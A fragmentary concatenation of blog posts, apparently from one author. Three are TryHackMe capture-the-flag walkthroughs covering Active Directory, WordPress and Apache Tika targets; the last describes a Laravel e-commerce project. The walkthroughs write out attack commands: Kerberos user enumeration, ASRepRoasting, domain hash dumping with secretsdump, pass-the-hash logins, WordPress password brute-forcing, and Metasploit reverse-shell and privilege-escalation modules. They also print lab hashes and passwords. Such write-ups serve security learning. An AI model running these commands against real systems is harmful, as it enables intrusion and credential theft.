The target is likely a Domain Controller  The target is part of a domain named spookysec.local  There are ton of services runningSMB (139, 445)Since it‚Äôs a guided room, we don‚Äôt have to explore all the services. Let‚Äôs map the domain spookysec.local to the the DC‚Äôs IP:echo \"$TARGET_IP spookysec.local\" &gt;&gt; /etc/hostsNext let‚Äôs enumerate smb with the enum4linux tool.

What is the NetBIOS-Domain Name of the machine?THM-AD  What invalid TLD do people commonly use for their Active Directory Domain?Earlier, we saw in the portscan that the FQDN  was spookysec.local. The TLD (Top Level Domain) is basically the ‚Äúextension‚Äù, in our case it‚Äôs .local.Enumerating usersWe are asked to use kerbrute with this username wordlist to bruteforce users from the Active Directory by attacking Kerberos, so let‚Äôs do that:kerbrute usernum --dc \"$TARGET_IP\" -d \"$DOMAIN_NAME\" \"$WORDLIST\"Kerbrute found a few AD usersI will put thoses usernames in a file before continuing:AdministratorGuestDefaultAccountWDAGUtilityAccountjamessvc-adminrobindarkstarbackupparadoxAnswering questions  What command within Kerbrute will allow us to enumerate valid usernames?userenum.

(These should jump out at you)backup could also potentially be interesting.ExploitationASRepRoasting  Impacket has a tool called ‚ÄúGetNPUsers.py‚Äù that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that‚Äôs necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.You can learn more about ASRepRoasting here. Basically, we query the Key Distribution Center (KDC) for TGTs (Ticket Granting Tickets) as other users. If the user is vulnerable to ASRepRoasting, the KDC will send us a TGT that we‚Äôll attempt to crack to obtain the user‚Äôs passwordLet‚Äôs use the GetNPUsers script from Impacket to search for ASRepRoastable users and ask the KDC for TGTs as those users.

This includes password hashes.Interesting ! That means that we can probably dump Domain Credentials using a tool like secretsdump:impacket-secretsdump -just-dc \"$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP\"And we get all the NTLM hashesAdministrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::We can authenticate with the Administrator hash without having to crack it (using pass-the-hash), and with krbtgt hash, we can create Golden Tickets (more on that later).Answering questions  What method allowed us to dump NTDS.DIT?DRSUAPI  What is the Administrators NTLM hash?The hashes are in the format LM:NT, so the response is 0e0363213e37b94221497260b0bcb4fc  What method of attack could allow us to authenticate as the user without the password?Pass The Hash  What method of attack could allow us to authenticate as the user without the password?-HGetting flagsThere are several tools that supports pass-the-hash and that could allow us to get an Administrator shell on the Domain Controller:  impacket-psexec  impacket-smbexec  impacket-wmiexec  evil-winrmLet‚Äôs go with evil-winrm:evil-winrm -i \"$TARGET\" -u \"$USERNAME\" -H \"$NT_HASH\" We succesfully used the pass-the-hash method to authenticate as adminAnd we can display grab the 3 flagsBonusGenerating Golden TicketsI always forget the commands so this section serves like a memo.

We will explore the exploitation of a vulnerable Wordpress website with wpscan and metasploit, before moving on to the privilege escalation phase using tools like pwncat, LinPEAS and ltrace.

For this I use rustscan. It‚Äôs basically a Rust-based port scanner that detects open ports, and then launches an nmap scan only on the discovered ports. You can specify options to the subsequent nmap scan by using the -- NMAP_OPTIONS syntax. I like to go with -sV for identification of services version, and -oN ports to save the result to a file named ports.rustscan -a $TARGET_IP -- -sV -oN ports‚îå‚îÄ‚îÄ(kali„âøkali)-[~]‚îî‚îÄ$ cat portsPORT    STATE SERVICE     REASON  VERSION22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernelWhat do we learn from this portscan ?

I also ran enum4linux to double check, but nothing interesting came up. Let‚Äôs move on.HTTP (80)You can learn more about WordPress enumeration in here.Seems like WordPress is runningManual enumerationAs you can see on the index page, the post has been written by Karen WheelerThere is a little trick that you can use to enumerate other users. Simply add ?author=X where X is a number at the end of the URL:I tried it with X=2 but it returned a 404 Not Found, so there are only two users on this WordPress website.Let‚Äôs try to login manually. Note that we cannot login with Karen Wheeler or Billy Joel as username, we need to login with their wordpress generated usernames, the first letter of the firstname and the lastname:        WpscanHere is the wpscan with irrelevant parts removed:‚îå‚îÄ‚îÄ(kali„âøkali)-[~]‚îî‚îÄ$ wpscan --url http://$TARGET_IP[+] robots.txt found: http://10.10.132.87/robots.txt | Interesting Entries: |  - /wp-admin/ |  - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100%[+] Upload directory has listing enabled: http://10.10.132.87/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Emoji Settings (Passive Detection) |  - http://10.10.132.87/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.0' | Confirmed By: Meta Generator (Passive Detection) |  - http://10.10.132.87/, Match: 'WordPress 5.0'[i] No plugins Found.I checked the /wp-content/uploads/ folder since it has directory listing enabled, but found nothing interesting there. Version is 5.0 which is quite old, so let‚Äôs search for potential exploits.SearchsploitWordpress 5.0 is an old version (the latest version is 6.7), so running searchsploit against this version might be a good ideaSearchsploit found a lot of exploits that match this WP versionThere are a ton of exploits, but only 5 of them affect WordPress itself and only 4 are of interest (the fifth is a DoS exploit).The others exploits target WP plugins, but we know from the wpscan that there are no plugins installed here. So we only need to test 4 exploits.The relevant exploitsWe have gathered enough information from the enumeration phase. Let‚Äôs move on to the exploitation part.ExploitationTesting searchsploit exploits            Exploit name      Problem                  php/webapps/49512.py      Authenticated              php/webapps/46511.js      Authenticated              php/remote/46662.rb      Authenticated              multiple/webapps/47690.md      Didn‚Äôt work      Bruteforcing WordPressSince all exploits are authenticated and we don‚Äôt have credentials, let‚Äôs try a dictionary attack with wpscan. First we will create the user wordlist, then launch the attack:‚îå‚îÄ‚îÄ(kali„âøkali)-[~]‚îî‚îÄ$ echo -e \"bjoel\\nkwheel\" &gt; real_users.txt‚îå‚îÄ‚îÄ(kali„âøkali)-[~]‚îî‚îÄ$ wpscan --url http://$TARGET_IP/ -U real_users.txt -P $PASSWORD_WORDLISTI started by trying the 2020-200_most_used_passwords.txt and the 2023-200_most_used_passwords.txt wordlists from SecLists but nothing came up. So I decied to be patient, and used the rockyou.txt wordlist. After a few minutes I got this:[+] Performing password attack on Xmlrpc against 2 user/s[SUCCESS] - kwheel / cutiepie1^C[!] Valid Combinations Found: | Username: kwheel, Password: cutiepie1 Getting RCEWe finally have our needed credentials: kwheel:cutiepie1.

So I setup the pwncat reverse listener in another terminal, and run a reverse shell from the meterpreter session like this:From meterpreter to pwncatUser flag ‚Ä¶ or notI tried to cat the user flag, but I got trolled:(remote) www-data@blog:/var/www/wordpress$ cat /home/bjoel/user.txtYou won't find what you're lookif for here.TRY HARDERLooking into the bjoel home directory, I came across a PDF. Downloaded it using pwncat and opened it:Joel was working for Rubber DuckyThis might be a clue, perhaps the flag is in /media/ or something:Not a big deal, we‚Äôll search for the user flag once we have root access.Manual enumerationLet‚Äôs start by enumerating the users that have a connection shell(remote) www-data@blog:/var/www/wordpress$ cat /etc/passwd | grep bashroot:x:0:0:root:/root:/bin/bashbjoel:x:1000:1000:Billy Joel:/home/bjoel:/bin/bashNext, let‚Äôs grab the content of the wp-config.php file. This file contains information required by WordPress to connect to the database such as:  db name  db host  db username  db password(remote) www-data@blog:/var/www/wordpress$ cat wp-config.php | grep DB_define('DB_NAME', 'blog');define('DB_USER', 'wordpressuser');define('DB_PASSWORD', 'LittleYellowLamp90!@');Tried using the database password to su bjoel and su root, but unfortunately it didn‚Äôt work. Next, I extracted the password for the bjoel WordPress user from the MySQL database and I attempted to crack it with john, but ‚Ä¶ my CPU ain‚Äôt powerful enough. Time for automated enumeration I guess.LinpeasNote: with pwncat, you can switch between the attacker‚Äôs shell and the victim‚Äôs shell by pressing Ctrl + D.Look at the last lineIt looks like there is an unknown SUID binary ! SUID (Set User ID) is a special permission with one key function: the binary executes as the user who owns the file. This means that if the binary is owned by root, it will execute with root privileges, even if launched by the www-data user. Therefore, it‚Äôs a significant privesc vector. More on that here.SUID binaryWhen we run the binary, it says ‚ÄúNot an Admin‚Äù. Let‚Äôs download it locally and try to ltrace it to examine dynamic libraries and syscall done by the binary:Downloading it with the help of pwncatAnalyzing it with ltraceFrom the ltrace output, we see that the binary checks the admin variable from the environment with the getenv() function. So we can just modify the admin env variable and set it to true. Once we do that we can grab our flags !Rooted !We use the find command to search for the real user.txt flag, which was indeed located in the /media/usb/, just as we suspected ."

    "content": "IntroductionHello everyone, today we will be taking a look at Cyberlens, an Easy rated room on TryHackMe. We will explore the exploitation of a vulnerable Windows server, before moving on to the privilege escalation phase using the Metasploit framework. Let‚Äôs get started !  Enumeration          Portscan      SMB (139,445)      HTTP (80)      HTTP (61777)        Exploitation          Exploiting with metasploit        Privesc          Privesc with metasploit      EnumerationPortscanAs always, I like to begin with a basic rustscan port scan, followed by an nmap scan with identification of services version, and output the result to a file named all_ports.rustscan -a $TARGET_IP -- -sV -oN all_ports‚îå‚îÄ‚îÄ(kali„âøkali)-[~]‚îî‚îÄ$ cat all_portsPORT        STATE SERVICE       REASON  VERSION80/tcp      open  http          syn-ack Apache httpd 2.4.57 ((Win64))135/tcp     open  msrpc         syn-ack Microsoft Windows RPC139/tcp     open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn445/tcp     open  microsoft-ds? syn-ack 3389/tcp    open  mw-wbt-server syn-ack Microsoft Terminal Services5985/tcp    open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)7680/tcp    open  panda-pub?    syn-ack 47001/tcp   open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)--------- lot of MSRPC opened ports, not of interest 61777/tcp   open  http          syn-ack Jetty 8.y.z-SNAPSHOTService Info: OS: Windows; CPE: cpe:/o:microsoft:windows What do we learn from this portscan ?  The target is a Windows Server  There are 4 HTTP servers, as well as SMB and RDP runningSMB (139, 445)I like to start by enumerating SMB because it‚Äôs relatively quick, and we always find juicy files. I‚Äôll use smbclient:‚îå‚îÄ‚îÄ(kali„âøkali)-[~]‚îî‚îÄ$ smbclient -L \"//$TARGET_IP/\"Password for [WORKGROUP\\kali]:session setup failed: NT_STATUS_ACCESS_DENIEDUnfortunately, nothing interesting came up.HTTP (80)The main functionality of this server is to provide image metadata extraction. However, pressing Ctrl + U revealed no form in the HTML source code:&lt;div class=\"detail-box\"&gt;    &lt;div class=\"heading_container\"&gt;            &lt;h2&gt;CyberLens Image Extractor&lt;/h2&gt;        &lt;/div&gt;        &lt;p&gt; &lt;!-- Uninteresting text ... --&gt; &lt;/p&gt;        &lt;input type=\"file\" id=\"imageFileInput\"&gt;        &lt;button id=\"metadataButton\"&gt;Get Metadata&lt;/button&gt;    &lt;div id=\"metadataOutput\"&gt;&lt;/div&gt;&lt;/div&gt;That means that the metadata extraction functionality is likely to be handled by JavaScript. Scrolling further in the HTML source code, I found the following JavaScript code, where I removed irrelevant part:document.getElementById(\"metadataButton\").addEventListener(\"click\", function() {    var fileInput = document.getElementById(\"imageFileInput\");    var reader = new FileReader();    var fileData = reader.result;    fetch(\"http://cyberlens.thm:61777/meta\", {        method: \"PUT\",        body: fileData,        headers: {            \"Accept\": \"application/json\",            \"Content-Type\": \"application/octet-stream\"        }    })}As you can see, the JavaScript sends the file we uploaded on port 61777. So the service responsible for the metadata handling is effectively running on port 61777.HTTP (61777)This seems to be a version disclosureLet‚Äôs take advantage of this significant version disclosure by running searchsploit on this Tika version:Searchsploit found a Metasploit module that matches the Tika versionExploitationMetasploitLet‚Äôs start by launching Metasploit and searching for the Tika exploit we identified in the enumeration part.Metasploit exploit module for Tika 1.17After typing show options, we notice that some parameters need to be configured.msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set RHOSTS $TARGET_IPRHOSTS =&gt; $TARGET_IPmsf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set RPORT 61777RPORT =&gt; 61777msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set LHOST $ATTACKER_IPLHOST =&gt; $ATTACKER_IPmsf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; run[*] Started reverse TCP handler on $ATTACKER_IP:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[+] The target is vulnerable.Within a few seconds, we‚Äôre greeted with a meterpreter session.And we get our first flag !PrivescMetasploitSince we are already in Metasploit, using the integrated post/multi/recon/local_exploit_suggester seems to be a great idea. Let‚Äôs start by backgrounding the meterpreter session by pressing Ctrl + Z, then let‚Äôs run the following commands:msf6 &gt; use multi/recon/local_exploit_suggestermsf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1msf6 post(multi/recon/local_exploit_suggester) &gt; runThis is essentially a post-exploitation module that automatically tries different methods to identify a way to escalate our privileges. You can read more about it here.Metasploit‚Äôs local_exploit_suggester in actionThe scan reveals several vulnerabilities, but only one is explicitly marked as ‚Äúvulnerable‚Äù (and not as ‚Äúappears to be vulnerable‚Äù). You can learn more about the ‚ÄúAlways Install Elevated‚Äù feature on the Microsoft official doc and read this ressource for an Attacker perspective.  Users with limited privileges can exploit this feature by creating a Windows Installer installation package (MSI) that      Creates a new local account in the local Administrators group    Adds their current account to the local Administrators group    Installs malicious software    Performs other unauthorized activities1  Let‚Äôs give it a try !msf6 &gt; use exploit/windows/local/always_install_elevated Some parameters need to be configured.msf6 exploit(windows/local/always_install_elevated) &gt; set SESSION 1msf6 exploit(windows/local/always_install_elevated) &gt; set LHOST $ATTACKER_IPmsf6 exploit(windows/local/always_install_elevated) &gt; set LPORT 9999msf6 exploit(windows/local/always_install_elevated) &gt; runAnd we‚Äôve rooted the roomReverse footnote            source (tenable)¬†&#8617;&#xfe0e;      "

    "content": "This project was my first project with the Laravel framework. I wanted to create a dynamic E-Commerce website, so I choose to use the Laravel/Livewire tech stack. Additionally, I used vanilla JS, some library like HTMX and Swiper, and Bootstrap for the front end part. I also used the Pusher websocket to create real-time notifications.General overviewThe products are sorted by categories. Each category has its own search bar, and there is a general search bar that searches across all categories. On the product display pages, you can see the products, their names, categories, prices, and average rating.          LoginYou can create an account with whatever email address you want, but you‚Äôll need to validate it by clicking on the link sent by email. You can reset your password using the same email address.          As you can see, livewire is used for the dynamic validation here.ProductYou can sell a product by adding it in the ‚Äúmarket‚Äù section. Give it a name, a price, a category, and a main image. You can also add secondary images. Finally, a MD-like editor is available for the product description (bold, italic, list, strikethrough text, links and so on).The drag &amp; drop functionnality is done with filepond.js.          CommentsYou can leave a comment on any product by adding a title, a rating, and your comment. Again, a markdown-like editor is available to help you style your text. Finally, you can ‚Äúheart‚Äù other people‚Äôs comments.          SettingsYou can customize your profile by changing your profile picture, email, or password. There is also a profile page displaying the products you are selling, the number of hearts your comments have received, your average product rating, the number of comments you have made, and a list of your recent comments.          PaymentWhen you add a product to your cart, it appears in the small dynamic cart icon in the navbar. Clicking on this cart icon takes you to a more detailed page where you also have the option to buy by making the payment (we have chosen to use Stripe).          I chose Livewire for the dynamic cart page.ChatboxThere is a chat that allows you to interact with sellers or other clients. It is dynamic and supports sending messages as well as images. Additionally, the notification component in the navbar uses WebSockets, making it real-time. Therefore, you will receive notifications instantly as they happen.          The dynamic notification component is updated using livewire + pusher.js websocket.SourceThe source code and installation instructions are accessible here.You‚Äôll also find a docker-compose file there if you want to test the application locally."
